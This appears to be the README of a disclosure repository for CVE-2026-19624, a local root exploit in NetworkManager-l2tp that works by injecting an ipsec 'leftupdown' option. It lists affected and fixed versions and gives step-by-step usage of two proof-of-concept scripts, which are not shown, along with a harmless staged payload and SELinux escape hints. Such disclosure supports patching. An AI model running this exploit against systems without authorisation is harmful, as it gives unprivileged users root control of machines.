# LinnemanLabs nm-l2tp Advisory

nm-l2tp fails to properly sanitize the VPN configuration from the local unprivileged user. An unprivileged user can inject config options passed to ipsec which runs as root. Using the `leftupdown` config option to specify commands we get root code exec.

On SELinux enforcing systems, read the article for the full escape to unconfined root.

Write-up is at [linnemanlabs.com/posts/nm-l2tp-newline-to-unconfined-root](https://linnemanlabs.com/posts/nm-l2tp-newline-to-root)

This vulnerability was assigned CVE-2026-19624.

## Affected Systems

| | |
|-|-|
| **Package** | NetworkManager-l2tp (Fedora/RHEL/SUSE) / network-manager-l2tp (Debian/Ubuntu) |
| **Component** | `nm-l2tp-service`, the root D-Bus VPN service |
| **Affected** | every release before the fixed set below, on every stable branch: 1.0.x, 1.2.x, 1.8.x, 1.20.x, 1.52.x |
| **Required access** | unprivileged local user with a login session. no admin, no `wheel`, no password |
| **Result** | code execution as root, SELinux escape to unconfined |
| **Last Vulnerable** | 1.52.2, 1.20.22, 1.8.8, 1.2.20, 1.0.14 |
| **Fixed in** | 1.52.4, 1.20.24, 1.8.10, 1.2.22, 1.0.16, commit [95b6b46f](https://github.com/nm-l2tp/NetworkManager-l2tp/commit/95b6b46f48a0c9eabc79272cd313f219110ef91c) |

Audited on Fedora 44 with NetworkManager 1.56.1 and NetworkManager-l2tp 1.52.2, and confirmed against upstream master at the time of reporting. Also tested the injection against RHEL 10 and Ubuntu 26.

## Contents

- [nm-l2tp-inject.py](nm-l2tp-inject.py) - performs the injection, fires the exploit.
- [nm-l2tp-poc-responder.py](nm-l2tp-poc-responder.py) - minimal IKEv2 PSK responder. Completes just the IKE SA so pluto fires leftupdown, no real VPN server needed. Runs as unprivileged user.

## Usage

Run both as an ordinary unprivileged user (no sudo), on a host with a vulnerable NetworkManager-l2tp and an active local login session:

1. Stage a payload at /tmp/x.sh
```
$ cat > /tmp/x.sh << EOF
#!/bin/sh
{ id; cat /proc/self/status; } > /tmp/ipsec-out.txt
EOF
```

On SELinux enforcing, stage the payload as `container_file_t` (`chcon -t container_file_t /tmp/x.sh`) and pick an escape - see the write-up.

2. start the local IKE responder (defaults match the injector: 127.0.0.2:5500)
```
python3 nm-l2tp-poc-responder.py
```

3. in a second shell, run the injection (from a local login session, not ssh)
```
python3 nm-l2tp-inject.py
```

4. Read /tmp/ipsec-out.txt

The injected `leftupdown` runs as root once the IKE SA establishes.

## Requirements

- `python3`, `python3-dbus` (the D-Bus injector)
- local login session, not ssh

## Cleanup

The exploit creates a new persistent NetworkManager connection profile under /etc/NetworkManager/system-connections/ each run. Remove them with:

```bash
nmcli -t -f UUID,NAME connection show | awk -F ':' '$2=="linnemanlabs-poc"{print $1}' | xargs -r -n1 nmcli connection delete
```

Run from the same local login session.

## Legal

These tools are intended for authorized security testing and research only.

Unauthorized use against systems you do not own or have explicit permission to test is illegal.

## License

MIT. Copy it, steal it, modify it, learn from it, share your improvements with me. Or don't. It's code, do what you want with it.
